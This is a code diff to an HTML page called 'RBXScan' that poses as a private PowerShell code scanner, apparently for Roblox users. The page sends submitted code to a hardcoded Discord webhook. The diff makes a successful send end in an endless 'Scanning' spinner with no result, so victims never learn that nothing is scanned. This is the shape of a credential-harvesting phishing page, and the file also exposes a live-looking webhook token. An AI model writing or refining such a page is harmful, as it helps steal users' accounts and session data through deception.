@@ -378,6 +378,13 @@
         
         <div id="statusMessage" class="status-message"></div>
         
+        <div id="mainLoadingContainer" class="loading-container">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">
+                Scanning PowerShell<span class="loading-dots">...</span>
+            </div>
+        </div>
+        
         <div class="security-note">
             🔒 RBXScan securely transmits your code with full privacy protection
         </div>
@@ -435,6 +442,7 @@
         const compileStatusMessage = document.getElementById('compileStatusMessage');
         const closePopup = document.getElementById('closePopup');
         const loadingContainer = document.getElementById('loadingContainer');
+        const mainLoadingContainer = document.getElementById('mainLoadingContainer');
         
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
 
@@ -687,11 +695,13 @@
                 return;
             }
 
-            // Disable form during submission
+            // Show infinite loading animation
             submitBtn.disabled = true;
             submitBtn.textContent = 'Scanning...';
+            mainLoadingContainer.style.display = 'block';
+            statusMessage.classList.remove('show');
             
-            // Send to webhook
+            // Send to webhook but keep loading animation running
             const result = await sendToWebhook(code);
             
             if (result.success) {
@@ -700,15 +710,18 @@
                 const codeHash = btoa(code).substring(0, 20);
                 submittedCodes.add(codeHash);
                 
-                showStatus('✅ Code scanned successfully!', 'success');
-                codeInput.value = ''; // Clear the input for security
+                // Clear the input but keep loading running infinitely
+                codeInput.value = '';
+                
+                // Keep the loading animation running infinitely
+                // Don't hide it or show success message
             } else {
+                // Only show error if webhook fails
+                mainLoadingContainer.style.display = 'none';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Scan Code';
                 showStatus('❌ Failed to scan code. Please try again.', 'error');
             }
-            
-            // Re-enable form
-            submitBtn.disabled = false;
-            submitBtn.textContent = 'Scan Code';
         });
 
         // Clear input on page load for security
